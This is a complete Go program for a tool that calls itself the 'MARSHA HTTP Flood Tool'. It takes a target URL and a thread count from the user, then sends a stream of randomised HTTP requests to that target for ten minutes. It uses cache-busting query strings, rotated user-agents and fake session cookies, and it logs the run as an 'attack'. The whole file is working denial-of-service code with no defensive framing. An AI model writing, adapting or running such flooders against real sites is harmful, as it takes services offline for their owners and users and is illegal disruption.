package main

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	//	"github.com/fatih/color"
	"github.com/sirupsen/logrus"
	"golang.org/x/time/rate"
)

var bufferPool = sync.Pool{
	New: func() interface{} {
		return new(bytes.Buffer)
	},
}

// Read user-agent list from a file
func loadUserAgents(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var userAgents []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		userAgents = append(userAgents, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return userAgents, nil
}

// Optimized random string generator
func randomString(r *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	str := make([]byte, length)
	for i := range str {
		str[i] = chars[r.Intn(len(chars))]
	}
	return string(str)
}

// Create an HTTP client
func createHttpClient() *http.Client {
	transport := &http.Transport{
		IdleConnTimeout:       30 * time.Second,
		MaxIdleConns:          1000,
		MaxIdleConnsPerHost:   1000,
		ExpectContinueTimeout: 1 * time.Second,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
		MaxConnsPerHost:       0,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
	}
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

// Send HTTP requests
func sendRequest(ctx context.Context, client *http.Client, targetURL string, wg *sync.WaitGroup, limiter *rate.Limiter, logChan chan string, userAgents []string) {
	defer wg.Done()
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	successCount := 0
	failCount := 0

	methods := []string{"GET", "POST", "HEAD", "OPTIONS"}

	jar, _ := cookiejar.New(nil)
	client.Jar = jar

	// Set cookies untuk setiap request
	u, _ := url.Parse(targetURL)
	client.Jar.SetCookies(u, []*http.Cookie{
		{Name: "session", Value: randomString(r, 32)},
		{Name: "visitor", Value: randomString(r, 16)},
	})

	for {
		select {
		case <-ctx.Done():
			logChan <- fmt.Sprintf("Goroutine finished: Success: %d, Fail: %d", successCount, failCount)
			return
		default:
			if err := limiter.Wait(ctx); err != nil {
				logChan <- fmt.Sprintf("[ERROR] Rate limiter error: %s", err)
				return
			}

			randomParam := randomString(r, 8)
			fullURL := fmt.Sprintf("%s?rand=%s", targetURL, randomParam)

			method := methods[r.Intn(len(methods))]
			req, err := http.NewRequest(method, fullURL, nil)
			if err != nil {
				failCount++
				logChan <- fmt.Sprintf("[ERROR] Failed to create request: %s", err)
				continue
			}
			req.Header.Set("User-Agent", userAgents[r.Intn(len(userAgents))])
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("X-Requested-With", "XMLHttpRequest")

			resp, err := client.Do(req)
			if err != nil {
				failCount++
				logChan <- fmt.Sprintf("[ERROR] Request failed: %s", err)
				continue
			}

			if resp.StatusCode == http.StatusOK {
				successCount++
			} else {
				failCount++
			}
			resp.Body.Close()
		}
	}
}

// Worker pool with centralized logging
func workerPool(ctx context.Context, numWorkers int, targetURL string, rateLimit time.Duration, log *logrus.Logger, userAgents []string) {
	var wg sync.WaitGroup
	client := createHttpClient()

	limiter := rate.NewLimiter(rate.Every(rateLimit), 5)
	logChan := make(chan string, 100)

	// Goroutine for periodic logging
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				close(logChan)
				return
			case <-ticker.C:
				for i := 0; i < len(logChan); i++ {
					msg, ok := <-logChan
					if ok {
						log.Info(msg)
					}
				}
			}
		}
	}()

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go sendRequest(ctx, client, targetURL, &wg, limiter, logChan, userAgents)
	}

	wg.Wait()
	close(logChan)
}

// Prompt for user input
func promptUserInput(promptText string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(promptText)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func main() {
	fmt.Println("MARSHA HTTP Flood Tool")
	fmt.Println()

	log := logrus.New()
	log.SetFormatter(&logrus.JSONFormatter{})
	log.SetOutput(os.Stdout)
	log.SetLevel(logrus.InfoLevel)

	targetURL := promptUserInput("Enter target URL: ")
	threadsInput := promptUserInput("Enter number of threads: ")
	var numThreads int
	fmt.Sscan(threadsInput, &numThreads)

	rateLimitInput := promptUserInput("Enter rate limit per request (e.g., 100ms): ")
	var rateLimit time.Duration
	fmt.Sscan(rateLimitInput, &rateLimit)

	userAgentFile := "user-agents.txt"
	userAgents, err := loadUserAgents(userAgentFile)
	if err != nil {
		log.WithError(err).Fatal("Failed to load user-agent file: user-agent.txt")
	}

	log.WithFields(logrus.Fields{
		"url":        targetURL,
		"numThreads": numThreads,
		"rateLimit":  rateLimit,
		"userAgents": len(userAgents),
	}).Info("Starting attack")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()

	workerPool(ctx, numThreads, targetURL, rateLimit, log, userAgents)
	log.Info("Attack complete")
}
